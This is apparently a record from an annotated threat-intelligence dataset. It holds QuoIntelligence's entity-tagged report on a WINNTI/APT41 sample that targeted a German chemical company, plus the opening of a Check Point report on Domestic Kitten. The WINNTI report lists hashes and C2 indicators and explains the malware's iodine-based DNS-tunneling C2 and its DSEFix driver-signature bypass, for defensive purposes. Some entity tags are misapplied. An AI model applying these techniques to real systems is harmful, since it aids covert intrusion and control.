In <TIMESTAMP>January 2020</TIMESTAMP>, <ORG>QuoIntelligence</ORG> (<ORG>QuoINT</ORG>) detected a new <THREAT_ACTOR>WINNTI</THREAT_ACTOR> sample uploaded to a
public virus scanner from a German location. Following our preliminary analysis, we
assessed with high confidence that the sample was used to target
a previously unreported German chemical company. As part of our responsible disclosure,
we alerted the affected entity, the local Law Enforcements, and our clients.
In the following weeks after our internal reporting, the German news media source
<ORG>Tagesschau</ORG> reported our initial detection and analysis of the sample, and confirmed the
chemical company’s awareness of the attack in <TIMESTAMP>the second half of 2019</TIMESTAMP>.
The <THREAT_ACTOR>WINNTI</THREAT_ACTOR> sample we analysed was highly likely developed in 2015, and likely used
around this year for the first time, it is unclear how long the compromise existed in the
compromised environment.
Although the malware was likely used years ago, further analysis revealed a previously
unreported C2 technique never attributed to any <THREAT_ACTOR>WINNTI</THREAT_ACTOR> Group’s toolkits.
The technique relies on a DNS Tunneling communication channel through a custom
implementation of the iodine source code, an open-source software that enables the
tunneling of IPv4 data through a DNS server.
Additionally, we uncovered a previously unknown stolen digital certificate being used to
digitally sign <THREAT_ACTOR>WINNTI</THREAT_ACTOR>-related attack components, and the targeting of a previously-unreported
South Korean video game company.
The sophistication of the techniques we uncovered confirms that the <THREAT_ACTOR>WINNTI</THREAT_ACTOR> Group is a
highly sophisticated, and highly committed Advanced Persistent Group  targeting a plethora
of different industry sectors in <COUNTRY>Europe</COUNTRY> and <COUNTRY>South Asia</COUNTRY>.

Introduction
The <THREAT_ACTOR>WINNTI</THREAT_ACTOR> Group (also known as <THREAT_ACTOR>APT41</THREAT_ACTOR>, <THREAT_ACTOR>BARIUM</THREAT_ACTOR>, and <THREAT_ACTOR>Blackfly</THREAT_ACTOR>) is an alleged Chinese state-
sponsored umbrella organization in China’s intelligence branch linked through their use of shared
goals and attack resources. The suspected state-sponsor link to China’s government pinpoints
that it likely has an incentive to continue targeting a variety of industries, especially one’s
highlighted as priority for China’s economic development.

On <TIMESTAMP>Friday, 13 January</TIMESTAMP>, <ORG>QuoIntelligence</ORG> (<ORG>QuoINT</ORG>) detected a new <THREAT_ACTOR>WINNTI</THREAT_ACTOR> sample uploaded to a
public virus scanner from a German location. Following our preliminary analysis, we assessed
with high confidence that the sample was used to target a previously unreported German

https://quointelligence.eu/2020/04/WINNTI-group-insights-from-the-past/
https://www.tagesschau.de/investigativ/ndr/hackerangriff-chemieunternehmen-101.html
https://github.com/yarrick/iodine


4/21/2020 <THREAT_ACTOR>WINNTI</THREAT_ACTOR> GROUP: Insights From the Past — <ORG>QuoIntelligence</ORG> - Our Finished Intelligence, Tailor-made for Your Organization

https://quointelligence.eu/2020/04/WINNTI-group-insights-from-the-past/ 2/13

chemical company. Additionally, during our analysis we uncovered a previously unknown stolen
digital certificate being used to digitally sign <THREAT_ACTOR>WINNTI</THREAT_ACTOR> related drivers, and a potential campaign
against an already known South Korean video game company. 

In the last year, researchers and journalists have publicly disclosed that the <THREAT_ACTOR>WINNTI</THREAT_ACTOR> group targeted
and eventually compromised <ORG>Henkel</ORG> (2014), <ORG>BASF</ORG> (2015), <ORG>Bayer</ORG> (2018) and <ORG>Roche</ORG> (2019). This
most recent previously unreported German chemical company is yet another German chemical
company targeted by <THREAT_ACTOR>WINNTI</THREAT_ACTOR> since 2015. Prior to our analysis this attack activity was not publicly
reported.

Figure 1: Timeline of attacks located in Germany and attributed to <THREAT_ACTOR>WINNTI</THREAT_ACTOR>

In <TIMESTAMP>December 2019</TIMESTAMP>, <ORG>Germany’s Federal Office for the Protection of the Constitution</ORG> (BfV) released
a report related to the alleged Chinese state sponsored umbrella organization known as the
<THREAT_ACTOR>WINNTI</THREAT_ACTOR> Group. Through our internal malware analysis, we are confident that the sample we
discovered is highly similar to the <THREAT_ACTOR>WINNTI</THREAT_ACTOR> sample described in the BfV report. The sample also
matches known characteristics of <THREAT_ACTOR>WINNTI</THREAT_ACTOR>’s arsenal shared through intelligence reports produced
by <ORG>ESET</ORG>.

Further, we have informed the affected company, law enforcement agencies, and sent a Warning
to our customers upon detection.

The <THREAT_ACTOR>WINNTI</THREAT_ACTOR> Group
The <THREAT_ACTOR>WINNTI</THREAT_ACTOR> Group (also known as <THREAT_ACTOR>APT41</THREAT_ACTOR>, <THREAT_ACTOR>BARIUM</THREAT_ACTOR>, and <THREAT_ACTOR>Blackfly</THREAT_ACTOR>) is an alleged Chinese state-
sponsored umbrella organization in China’s intelligence branch linked through their use of shared
goals and attack resources. Notably, various operations attributed to other China-linked threat
actor groups, such as <THREAT_ACTOR>APT17</THREAT_ACTOR> and <THREAT_ACTOR>Ke3chang</THREAT_ACTOR>, have also leveraged its backdoor malware. Active
since at least 2010, initial attacks attributed to the group heavily targeted the gaming industry.
However, as researchers have continued to follow and dissect the group and its activity, the
group’s target focus has expanded to other industries, including <INDUSTRY>chemical</INDUSTRY>, <INDUSTRY>pharmaceutical</INDUSTRY>,
<INDUSTRY>technology</INDUSTRY>, and <INDUSTRY>software</INDUSTRY>. Further, the group’s evolution involves the <INDUSTRY>enhancement</INDUSTRY>, <INDUSTRY>development</INDUSTRY>,
and inclusion of new tools and tactics.

The suspected state-sponsor link to <ORG>China’s government</ORG>, pinpoints that it likely has an incentive
to continue targeting a variety of industries, especially one’s highlighted as priority for China’s
economic development. In the latest <THREAT_ACTOR>WINNTI</THREAT_ACTOR> Group public report, <ORG>FireEye</ORG> researchers reported of

https://www.verfassungsschutz.de/download/broschuere-2019-12-bfv-cyber-brief-2019-01.pdf
https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_<THREAT_ACTOR>WINNTI</THREAT_ACTOR>.pdf
https://www.fireeye.com/blog/threat-research/2020/03/<THREAT_ACTOR>APT41</THREAT_ACTOR>-initiates-global-intrusion-campaign-using-multiple-exploits.html


4/21/2020 <THREAT_ACTOR>WINNTI</THREAT_ACTOR> GROUP: Insights From the Past — <ORG>QuoIntelligence</ORG> - Our Finished Intelligence, Tailor-made for Your Organization

https://<ORG>QuoIntelligence</ORG>.eu/2020/04/<THREAT_ACTOR>WINNTI</THREAT_ACTOR>-group-insights-from-the-past/ 3/13

a new widespread campaign attributed to <THREAT_ACTOR>APT41</THREAT_ACTOR> which involves exploitation attempts of recently
disclosed and patched vulnerabilities for products of <ORG>Cisco</ORG>, <ORG>Citrix</ORG>, and <ORG>Zoho</ORG>. The campaign
waves apparently take a more targeted approach to selecting potential victims across various
sectors including <INDUSTRY>financials</INDUSTRY>, <INDUSTRY>government</INDUSTRY>, and <INDUSTRY>information technology</INDUSTRY>. According to the
researchers, identified victim systems demonstrated the threat actor leveraged commercially
available post exploitation tools such as <MALWARE>Cobalt Strike</MALWARE> and <MALWARE>Meterpreter</MALWARE>, which are essentially full
featured backdoors.

Technical Analysis

Sample Targeting German Chemical Company
The main artifact uploaded to VirusTotal is a Dynamic Link Library (DLL) file, with a compilation
timestamp suggesting the sample was built in <TIMESTAMP>>August 2015</TIMESTAMP>. Although the compilation time might
be legitimate, it is not possible to determine when and how long the attackers used this malware.

HASHES Compilation

Timestamp

File‐
name

MD5: <IOC>c893a12ff72698f09f89f778e4c9cd2b</IOC>
SHA1: <IOC>06256946a69409cd18859bfa429184a282374d76</IOC>
SHA256:
<IOC>df6af36626d375c5e8aff45c64bfc1975d753b109e126a6cb30ee0523550329c</IOC>

2015-08-06
01:52:51

<MALWARE>TmPfw‐RVS.dll</MALWARE>

Table 1 – <THREAT_ACTOR>WINNTI</THREAT_ACTOR> sample

Binary Analysis

Similar to other <THREAT_ACTOR>WINNTI</THREAT_ACTOR> samples, the configuration section contains a string referring to the name
of the campaign. In this case, at 0X020, the referred campaign name is the name of the chemical
company – redacted for the purposes of this blog.

Figure 2 – Extracted configuration from <THREAT_ACTOR>WINNTI</THREAT_ACTOR> sample

The analysed artifact we observed contains the  following binaries listed below, and also aligns
with observations in the BfV report.

HASHES Compilation
Timestamp

Filename



4/21/2020 <THREAT_ACTOR>WINNTI</THREAT_ACTOR> GROUP: Insights From the Past — <ORG>QuoIntelligence</ORG> - Our Finished Intelligence, Tailor-made for Your Organization

https://quointelligence.eu/2020/04/WINNTI-group-insights-from-the-past/ 4/13

MD5: c893a12ff72698f09f89f778e4c9cd2b
SHA1:
06256946a69409cd18859bfa429184a282374d76
SHA256: 
df6af36626d375c5e8aff45c64bfc1975d753b109e126a6cb30ee0523550329c

2015-08-06
01:52:51

<MALWARE>TmPfwRVS.dll</MALWARE>

MD5: <IOC>cf140dc4cad9e8216545593a4c08c7be</IOC>

SHA1:
<IOC><IOC>2b319b44451abb0596b9187e06f1fb7b4ace969d</IOC>

SHA256:
bfa8948f72061eded548ef683830de068e438a6eaf2da44e0398a37ac3e26860</IOC>

2015-08-05
12:08:00

<IOC>driver1.sys</IOC>

MD5: <IOC>cc95391d75ce2443740f60114fe30ae9</IOC>

SHA1: <IOC>30d1dd1dd4f0ace7a4f2c24e31fb6a0ee33e8a3a</IOC>

SHA256:
<IOC>8ddc6dd9fc3640cd786dfbc72212cd001d9369817aa69e0a2fa25e29560badcf</IOC>

2015-05-05
11:31:13

<IOC>driver2.sys</IOC>

MD5: <IOC>b4e66b445b39d0368bbe4b91a3cd98ff</IOC>

SHA1:
<IOC>2bc358ddc72f59ba0373b8635ab08ad747c12180</IOC>

SHA256:
<IOC>1865013aaca0f12679e35f06c4dad4e00d6372415ee8390b17b4f910fee1f7a2</IOC>

2014-12-15
16:06:41

<IOC>dsefix.exe</IOC>

MD5: <IOC>eaea9ccb40c82af8f3867cd0f4dd5e9d</IOC>

SHA1:
<IOC>7c1b25518dee1e30b5a6eaa1ea8e4a3780c24d0c</IOC>

SHA256:
<IOC>cf3a7d4285d65bf8688215407bce1b51d7c6b22497f09021f0fce31cbeb78986</IOC>

2008-May-31
02:18:53 UTC

<IOC>vbox‐drv.sys</IOC>

Table 2 – Additional artifacts contained by
<IOC>bfa8948f72061eded548ef683830de068e438a6eaf2da44e0398a37ac3e26860</IOC>

Analysis of <IOC>dsefix.exe</IOC>

This is essentially Windows x64 Driver Signature Enforcement Overrider (DSEFix), used   to
temporarily disable the driver signature enforcement on Windows systems by using an included
old, legit VirtualBox driver, both signed and exploitable. By running dsefix.exe, the malware can

https://github.com/hfiref0x/DSEFix


4/21/2020 <THREAT_ACTOR>WINNTI</THREAT_ACTOR> GROUP: Insights From the Past — <ORG>QuoIntelligence</ORG> - Our Finished Intelligence, Tailor-made for Your Organization

https://quointelligence.eu/2020/04/WINNTI-group-insights-from-the-past/ 5/13

bypass driver verification and install its own drivers. We identified the following two drivers which
were embedded in the earlier described main artifact. To note that this technique does not work
on moden Windows (e.g. <SOFTWARE>Windows 10</SOFTWARE>) – yet another piece of evidence that this malware was
designed and used multiple years ago.

Analysis of vboxdriver

This is the vulnerable, correctly signed with a digital certificate, <SOFTWARE>VirtualBox</SOFTWARE> driver that is used for
exploitation. It is used regularly by various threat actors, and by the previously highlighted
dsefix.exe. The driver can also be used to perform the Turla Driver Loader (TDL) exploitation
technique, a similar technique as DSEFix.

Analysis of driver1.sys

In late 2019, <ORG>ExaTrack</ORG> released their analysis of a signed <THREAT_ACTOR>WINNTI</THREAT_ACTOR> rootkit previously observed in
the wild, which we confirm is essentially the same rootkit driver.  The sample is capable of
injecting raw packets into the network and receiving special formatted packets. In comparison,
our variant has the same exact number of bytes, and there are large parts exactly matching.

Analysis of driver2.sys

This rootkit driver seems to be largely the same as driver1.sys with the same characteristics
including structure, I/O control, and device strings. However, this driver supports different versions
of Windows. It checks for ranges of Windows New Technology (NT) build numbers and returns
early.

C2 DNS Tunneling

By analyzing the malware, it is possible to find two network indicators within its code:

Figure 3 – observed network IoCs in <THREAT_ACTOR>WINNTI</THREAT_ACTOR> sample

The hardcoded 208.67.222.222 is a legitimate OpenDNS DNS server (resolver1.opendns.com).
This IP is pushed into a list that is generated by the malware at runtime. Likely, the initiation
routine also populates the list with the system’s DNS, and the OpenDNS server is only used as
fallback case to ensure the C2 domain gets resolved.

The dick[.]mooo[.]com FQDN name is offered by FreeDNS, which is a free dynamic DNS service.
Notably, in the last years, multiple researchers have reported <THREAT_ACTOR>WINNTI</THREAT_ACTOR>/PlugX C2 hostnames hosted
in the mooo[.]com zone. In the code we observed that a dot (.) is enforced before the FQDN.
Additional analysis revealed that the malware generates subdomains with base128 encoding, and
append them to FQDN. 

https://github.com/hfiref0x/TDL
https://exatrack.com/public/WINNTI_EN.pdf
https://freedns.afraid.org/


4/21/2020 <THREAT_ACTOR>WINNTI</THREAT_ACTOR> GROUP: Insights From the Past — <ORG>QuoIntelligence</ORG> - Our Finished Intelligence, Tailor-made for Your Organization

https://<ORG>QuoIntelligence</ORG>.eu/2020/04/<THREAT_ACTOR>WINNTI</THREAT_ACTOR>-group-insights-from-the-past/ 6/13

Code 1 – Hostname length restriction

Further, dots are added into it every 57 characters potentially as a hostname length restriction,
suggesting the expectation of long hostnames. We confirm the buffer can support FQDN’s up to
2000 characters.

Upon further investigation we found out that the malware includes the open source iodine source
code – software that enables the tunneling of IPv4 data through a DNS server. Interestingly, we
are not aware of any earlier documentation highlighting <THREAT_ACTOR>WINNTI</THREAT_ACTOR> specifically leveraging iodine for
DNS tunneling. However, researchers at the Ruhr University Bochum, while hunting for DNS
tunnels, observed <THREAT_ACTOR>APT32</THREAT_ACTOR> and <THREAT_ACTOR>Wekby</THREAT_ACTOR> APT groups using NULL and TXT records as a C2
communication channel, as well as mentioning the mooo[.]com top level domain in their findings.

The implementation of iodine used in the <THREAT_ACTOR>WINNTI</THREAT_ACTOR> sample is integrated and uses some custom
wrapper, as evidence by the matching functions we discuss in further detail in the following
section.

Use of Iodine for C2 DNS Tunneling

The iodine DNS tunneling solution is embedded in the DLL that is initially loaded and executed in
memory, and includes at least the following 15 matching functions:

Table 3 – Malware DLL Functions

For instance, the 64bit executable contains the build_hostname function (Code 2), which
corresponds with the older 32bit version (compiled with debug symbols) of iodine 0.6.0 (Code 3):

https://github.com/yarrick/iodine
https://www.farsightsecurity.com/assets/documents/A_Study_of_Newly_Observed_Hostnames_and_DNS_Tunneling_in_the_Wild.pdf


4/21/2020 <THREAT_ACTOR>WINNTI</THREAT_ACTOR> GROUP: Insights From the Past — <ORG>QuoIntelligence</ORG> - Our Finished Intelligence, Tailor-made for Your Organization

https://<ORG>QuoIntelligence</ORG>.eu/2020/04/<THREAT_ACTOR>WINNTI</THREAT_ACTOR>-group-insights-from-the-past/ 7/13

Code 2- iodine_0-6-0_build_hostname

Code 3- iodine_0-6-0_build_hostname

Based on the presence of the functions base128_blksize_enc and base128_blksize_raw, we
determined the version used, while not exactly known, is from before May 2017 when a patch
removed those functions. Further, comparative analysis indicates that for the implementation of
iodine in this <THREAT_ACTOR>WINNTI</THREAT_ACTOR> attack operation, there is no perfect match for the two versions having 64bit
pre-compiled binaries. This indicates iodine was compiled from source, and it is reasonable it is
being used as a library, and not in its normal distribution format of a standalone executable.



4/21/2020 <THREAT_ACTOR>WINNTI</THREAT_ACTOR> GROUP: Insights From the Past — <ORG>QuoIntelligence</ORG> - Our Finished Intelligence, Tailor-made for Your Organization

https://quointelligence.eu/2020/04/WINNTI-group-insights-from-the-past/ 8/13

The DNS Tunneling technique adopted by the malware through the use of iodine is detailed in the
figure below.

Figure 4 – C2 channel over DNS

1. The malware generates a hostname and appends it to the embedded C2
<IOC>dick[.]mooo[.]com</IOC>, and makes a NULL query to the resulted FQDN (e.g. abcde is appended
to <IOC>dick[.]mooo[.]com)</IOC>. Notably, NULL and TXT DNS request types are iodine’s preferred
channels since they are “expected to provide the largest downstream bandwidth”. It is
hence not a coincidence that researchers at Ruhr University Bochum also observed an
extensive use of NULL request types for DNS Tunneling purposes in their research.

2. The infected host sends the DNS query to one of the DNS servers included in the list
populated at runtime, eventually to the OpenDNS fallback server. At this point the DNS
server executes a recursive DNS query by contacting the Name Servers (NS) of each zone,
until the Authoritative NS of <IOC>dick[.]mooo[.]com</IOC> is obtained. To note, FreeDNS does provide
users the capability to delegate the authority of their subdomains to external NS. In the
described scenario, attackers delegated the NS of their subdomain to use their NS as a de-
facto C2 server.

3. The DNS server returns the authoritative answer by forwarding the content of the NULL
record type to the infected host. Notably, the legit DNS server acts as a proxy between the
infected host and the malicious server, by making impossible for defenders the application
of any filtering at the Network (L3) level.

The NULL DNS record type

The implementation of NULL type tunneling can be observed in the following excerpt taken while
reversing the malware:

https://github.com/yarrick/iodine


4/21/2020 <THREAT_ACTOR>WINNTI</THREAT_ACTOR> GROUP: Insights From the Past — <ORG>QuoIntelligence</ORG> - Our Finished Intelligence, Tailor-made for Your Organization

https://quointelligence.eu/2020/04/WINNTI-group-insights-from-the-past/ 9/13

The third argument when calling dns_encode shall be of the type “struct query”
from Iodine’s dns.c

According to common.h, “struct query” is defined as:

Since QUERY_NAME_SIZE equals to 512  (4
*128 – integers are 4 bytes) the query[128] call
obtained from the reversing activity is indeed
the DNS query type.

As noted, reversing activity detailed the
query[128] value to be 0xa. From
Iodine’s windows.h T_NULL is
DNS_TYPE_NULL

Finally, from Windows’s
documentation, DNS_TYPE_NULL is actually a
Windows constant equal to 0xa

https://github.com/yarrick/iodine/blob/27e5d6fadd997ff167c70a431d41adae26428d41/src/dns.c#L232
https://github.com/yarrick/iodine/blob/27e5d6fadd997ff167c70a431d41adae26428d41/src/common.h#L86
https://github.com/yarrick/iodine/blob/27e5d6fadd997ff167c70a431d41adae26428d41/src/windows.h#L39
https://docs.microsoft.com/en-us/windows/win32/dns/dns-constants


4/21/2020 <THREAT_ACTOR>WINNTI</THREAT_ACTOR> GROUP: Insights From the Past — <ORG>QuoIntelligence</ORG> - Our Finished Intelligence, Tailor-made for Your Organization

https://quointelligence.eu/2020/04/WINNTI-group-insights-from-the-past/ 10/13

<THREAT_ACTOR>WINNTI</THREAT_ACTOR> Signed Code With Digital Certificate from IQ Technology

During our analysis of the <THREAT_ACTOR>WINNTI</THREAT_ACTOR> sample configured to target the German chemical company, our
comparative analysis of other <THREAT_ACTOR>WINNTI</THREAT_ACTOR> related drivers revealed a digital certificate issued to IQ
Technology, a Taiwanese company producing Natural language processing (NLP) and Artificial
Intelligence (AI) software. The rootkit driver aligns with the already known driver1.sys. While it is a
known TTP that <THREAT_ACTOR>WINNTI</THREAT_ACTOR> attributed attacks have involved stolen digital certificates for code signing
its malware components, the use of this certificate is not publicly discussed, except for a brief
report from a security researcher apparently associated with a Vietnamese security company.
Although the report is no longer online,  the discussed sample contains a compilation timestamp
of August 2015, which is the earliest one observed in the wild that we identified using this digital
certificate. At the time of analysis, the digital certificate was already revoked.

The sample’s structure, debug symbols, and explanatory debug messages included within
suggests it is highly likely be a development version. Additionally, the compilation timestamp
indicates the sample was created 20 minutes prior to the driver1.sys.  Both samples are highly
related, and its contents combined with the date of  analysis and reporting essentially solidify that
it existed in 2015; however, this does not necessarily corroborate to an attack timeframe.

Sample Targeting South Korean Gaming Company

HASHES Compilation
Timestamp

MD5: <IOC>00961922e22e6a5d30b1d6fbd667d3c4</IOC>

SHA1: <IOC>0fd54c26b593bd9e9218492d50d8873521c0ec0d</IOC>

SHA256:
<IOC>4209b457f3b42dd2e1e119f2c9dd5b5fb1d063a77b49c7acbae89bbe4e284fb9</IOC>

2016-03-07
09:44:01

https://hybrid-analysis.com/sample/a5d6139921576c3aedfc64e2b37ae1a64f3160bd1bb70d4fc7fce956029e7d55?environmentId=2&lang=en


4/21/2020 <THREAT_ACTOR>WINNTI</THREAT_ACTOR> GROUP: Insights From the Past — <ORG>QuoIntelligence</ORG> - Our Finished Intelligence, Tailor-made for Your Organization

https://quointelligence.eu/2020/04/WINNTI-group-insights-from-the-past/ 11/13

Table 3 – observed network IoCs in <THREAT_ACTOR>WINNTI</THREAT_ACTOR> sample

On 21 February, we detected the new submission of a 64-bit <THREAT_ACTOR>WINNTI</THREAT_ACTOR> executable to a public online
malware scanning service. As multiple researchers have reported, <THREAT_ACTOR>WINNTI</THREAT_ACTOR> operators embed the
name of their target directly into the malware, but in an obfuscated manner.

Binary Analysis

The sample resembles the <THREAT_ACTOR>WINNTI</THREAT_ACTOR> Dropper Install.exe described by ESET, since it is a command
line executable used to drop and load additional encrypted payload:

Unfortunately we were not able to find the payload meant to be decrypted by this dropper.

However, we were able to extract the malware’s configuration file and identify the intended target.
In this case, the following string was included within the extracted configuration:

Based on previous knowledge and targeting of the <THREAT_ACTOR>WINNTI</THREAT_ACTOR> Group, we assess that this sample was
likely used to target <ORG>Gravity Co., Ltd.</ORG>, a South Korean video game company. The company is
known for its Massive Multiplayer Online Role Playing Game (MMORPG) Ragnarok Online, which
is also offered as a mobile application. As we have also reported in the past, the video game
industry is one of the preferred targets of the <THREAT_ACTOR>WINNTI</THREAT_ACTOR> Group, especially for those companies
operating in <COUNTRY>South Korea</COUNTRY> and <COUNTRY>Taiwan</COUNTRY>. Interestingly, <ORG>ESET</ORG> researchers, while reporting on multiple
<THREAT_ACTOR>WINNTI</THREAT_ACTOR> Group campaigns targeting the video game industry, listed in their report a C2 server
having a Campaign ID GRA KR 0629.

Excerpt from ESET Research White paper “CONNECTING THE DOTS Exposing the arsenal and
methods of the <THREAT_ACTOR>WINNTI</THREAT_ACTOR> Group”

At this time, we do not have any further evidence supporting a potential link between the sample
we analysed and the C2 detailed by <ORG>ESET</ORG>, but the coincidence between the C2 Campaign
ID/Location with the Campaign ID we extracted from the <THREAT_ACTOR>WINNTI</THREAT_ACTOR> dropper is worth noting.

Conclusion

http://www.gravity.co.kr/en/games/
https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_<THREAT_ACTOR>WINNTI</THREAT_ACTOR>.pdf


4/21/2020 <THREAT_ACTOR>WINNTI</THREAT_ACTOR> GROUP: Insights From the Past — <ORG>QuoIntelligence</ORG> - Our Finished Intelligence, Tailor-made for Your Organization

https://quointelligence.eu/2020/04/WINNTI-group-insights-from-the-past/ 12/13

The <THREAT_ACTOR>WINNTI</THREAT_ACTOR> Group has exhibited their ability to breach different organizations and conduct
sophisticated attack operations, typically motivated by espionage and financial gain, with various
TTPs and malware toolkits. While attribution is not concrete due to the complexity of the group,
there are links that can be drawn between operations which suggest the threat actors purporting
the attacks are likely operating within the <THREAT_ACTOR>WINNTI</THREAT_ACTOR> Group, or at least sharing resources.  

The detection of this unreported <THREAT_ACTOR>WINNTI</THREAT_ACTOR> variant uploaded to VirusTotal and targeting a German
chemical company aligns with our prior observations and research from previous intelligence
reporting highlighting <THREAT_ACTOR>WINNTI</THREAT_ACTOR> Group’s interest in German DAX companies. As a result,
organizations of all sizes, but especially small to medium sized companies, including Germany’s
hidden champions, should prepare against such threats as they are vital to the economic
ecosystem and continuous development of niche markets. Government oversight (local, regional,
and across the EU) should ensure susceptible organizations such as these are following
regulation and implementing security best practices to protect against future attacks.

Appendix

Indicators of Compromise

<IOC>4209b457f3b42dd2e1e119f2c9dd5b5fb1d063a77b49c7acbae89bbe4e284fb9</IOC>

<IOC>f3a7d4285d65bf8688215407bce1b51d7c6b22497f09021f0fce31cbeb78986</IOC>

<IOC>1865013aaca0f12679e35f06c4dad4e00d6372415ee8390b17b4f910fee1f7a2</IOC>

<IOC>8ddc6dd9fc3640cd786dfbc72212cd001d9369817aa69e0a2fa25e29560badcf</IOC>

<IOC>bfa8948f72061eded548ef683830de068e438a6eaf2da44e0398a37ac3e26860</IOC>

<IOC>df6af36626d375c5e8aff45c64bfc1975d753b109e126a6cb30ee0523550329c</IOC>

<IOC>4209b457f3b42dd2e1e119f2c9dd5b5fb1d063a77b49c7acbae89bbe4e284fb9</IOC>

<IOC>cf3a7d4285d65bf8688215407bce1b51d7c6b22497f09021f0fce31cbeb78986</IOC>

<IOC>1865013aaca0f12679e35f06c4dad4e00d6372415ee8390b17b4f910fee1f7a2</IOC>

<IOC>8ddc6dd9fc3640cd786dfbc72212cd001d9369817aa69e0a2fa25e29560badcf</IOC>

<IOC>bfa8948f72061eded548ef683830de068e438a6eaf2da44e0398a37ac3e26860</IOC>

<IOC>df6af36626d375c5e8aff45c64bfc1975d753b109e126a6cb30ee0523550329c</IOC>

<IOC>*.dick[.]mooo[.]com</IOC>

<IOC>208[.]67[.]222[.]222</IOC>

https://web.br.de/interaktiv/WINNTI/index.html


4/21/2020 <THREAT_ACTOR>WINNTI</THREAT_ACTOR> GROUP: Insights From the Past — <ORG>QuoIntelligence</ORG> - Our Finished Intelligence, Tailor-made for Your Organization

https://QuoIntelligence.eu/2020/04/WINNTI-group-insights-from-the-past/ 13/13

<IOC>45[.]248[.]85[.]200</IOC>

MITRE ATT&CK

Tactic Technique Recommended Course of Action

Persis‐
tence /
Privilege
Escalation

<MITRE_ATTACK>T1215</MITRE_ATTACK> Kernel
Modules and
Extensions

<MITRE_ATTACK>T1068</MITRE_ATTACK> Ex‐
ploitation for
Privilege
Escalation

Anti-Virus software and Advanced End-Point solution can
drastically reduce the risk of both techniques.

Defense
Evasion

<MITRE_ATTACK>T1009</MITRE_ATTACK> Binary
Padding

<MITRE_ATTACK>T1014</MITRE_ATTACK> Rootkit

<MITRE_ATTACK>T1116</MITRE_ATTACK> Code
Signing

Many of the samples analysed were signed with expired /
revoked certificate. Enforce signature validation via Group
Policies for executables

Exfiltration <MITRE_ATTACK>T1022</MITRE_ATTACK> Data
Encrypted

<MITRE_ATTACK>T1048</MITRE_ATTACK> Exfil‐
tration Over
Alternative
Protocol

– For DNS Tunnel, ensure that DNS logs are collected
and reviewed.

– DNS telemetic data should be also collected in order to
spot frequent and  heavy loaded DNS communication that
are definitely not related to an usual DNS query.

– FreeDNS and DynDNS servers should be
blacklisted/synkholed if not strictly required

– DNS NULL type queries should not be avoided. Only
the required record types should be allowed.

Learn more about our Threat Intelligence service
Subscribe to our newsletter with your business email to receive intelligence summaries,
analytic product updates, and more!

Subscribe

https://attack.mitre.org/techniques/T1215/
https://attack.mitre.org/techniques/T1068/
https://attack.mitre.org/techniques/T1009/
https://attack.mitre.org/techniques/T1014/
https://attack.mitre.org/techniques/T1116/
https://attack.mitre.org/techniques/T1022/
https://attack.mitre.org/techniques/T1048/
https://quointelligence.eu/#offering",WINNTI;APT41;BARIUM;Blackfly;APT17;Ke3chang;APT32;Wekby,Windows 10;VirtualBox,chemical;pharmaceutical;technology;software;enhancement;development;financials;government;information technology,"QuoIntelligence;ESET;QuoINT;Tagesschau;Henkel;BASF;Bayer;Roche;Germany’s Federal Office for the Protection of the Constitution;China’s government;FireEye;Cisco;Citrix;Zoho;ExaTrack;Gravity Co., Ltd.","January 2020;the second half of 2019;Friday, 13 January;December 2019;>August 2015",Cobalt Strike;Meterpreter;TmPfw‐RVS.dll;TmPfwRVS.dll,Europe;South Asia;South Korea;Taiwan,"df6af36626d375c5e8aff45c64bfc1975d753b109e126a6cb30ee0523550329c;8ddc6dd9fc3640cd786dfbc72212cd001d9369817aa69e0a2fa25e29560badcf;1865013aaca0f12679e35f06c4dad4e00d6372415ee8390b17b4f910fee1f7a2;bfa8948f72061eded548ef683830de068e438a6eaf2da44e0398a37ac3e26860;4209b457f3b42dd2e1e119f2c9dd5b5fb1d063a77b49c7acbae89bbe4e284fb9;dsefix.exe;cf3a7d4285d65bf8688215407bce1b51d7c6b22497f09021f0fce31cbeb78986;dick[.]mooo[.]com;c893a12ff72698f09f89f778e4c9cd2b;06256946a69409cd18859bfa429184a282374d76;cf140dc4cad9e8216545593a4c08c7be;2b319b44451abb0596b9187e06f1fb7b4ace969d

SHA256:
bfa8948f72061eded548ef683830de068e438a6eaf2da44e0398a37ac3e26860;2b319b44451abb0596b9187e06f1fb7b4ace969d;driver1.sys;cc95391d75ce2443740f60114fe30ae9;30d1dd1dd4f0ace7a4f2c24e31fb6a0ee33e8a3a;driver2.sys;b4e66b445b39d0368bbe4b91a3cd98ff;2bc358ddc72f59ba0373b8635ab08ad747c12180;eaea9ccb40c82af8f3867cd0f4dd5e9d;7c1b25518dee1e30b5a6eaa1ea8e4a3780c24d0c;vbox‐drv.sys;dick[.]mooo[.]com);00961922e22e6a5d30b1d6fbd667d3c4;0fd54c26b593bd9e9218492d50d8873521c0ec0d;f3a7d4285d65bf8688215407bce1b51d7c6b22497f09021f0fce31cbeb78986;*.dick[.]mooo[.]com;208[.]67[.]222[.]222;45[.]248[.]85[.]200",,,,T1215;T1068;T1009;T1014;T1116;T1022;T1048,,,,,,74,2,9,36,5,4,4,42,0,0,0,7,0,0,0,0,0
Domestic Kitten An Iranian Surveillance Operation,"<THREAT_ACTOR>Domestic Kitten</THREAT_ACTOR>: An Iranian Surveillance Operation


<TIMESTAMP>September 7, 2018</TIMESTAMP>

<THREAT_ACTOR>Domestic Kitten</THREAT_ACTOR>: An Iranian Surveillance Operation
research.checkpoint.com/domestic-kitten-an-iranian-surveillance-operation/

Chinese strategist <IDENTITY>Sun Tzu</IDENTITY>, Italian political philosopher <IDENTITY>Machiavelli</IDENTITY> and English philosopher
<IDENTITY>Thomas Hobbes</IDENTITY> all justified deceit in war as a legitimate form of warfare. Preceding them
all, however, were some in the <COUNTRY>Middle East</COUNTRY> who had already internalized and implemented
this strategy to great effect, and continue to do so today.

Recent investigations by <ORG>Check Point</ORG> researchers reveal an extensive and targeted attack
that has been taking place <TIMESTAMP>since 2016</TIMESTAMP> and, until now, has remained under the radar due to
the artful deception of its attackers towards their targets. Through the use of mobile
applications, those behind the attack use fake decoy content to entice their victims to
download such applications, which are in fact loaded with spyware, to then collect sensitive
information about them. Interestingly, these targets include Kurdish and Turkish natives
and <ORG>ISIS</ORG> supporters. Most interesting of all, though, is that all these targets are actually
Iranians citizens.

What Information is Collected?

Considering the nature of the target, the data collected about these groups provides those
behind the campaign with highly valuable information that will no doubt be leveraged in
further future action against them. Indeed, the malware collects data including contact lists
stored on the victim’s mobile device, phone call records, SMS messages, browser history
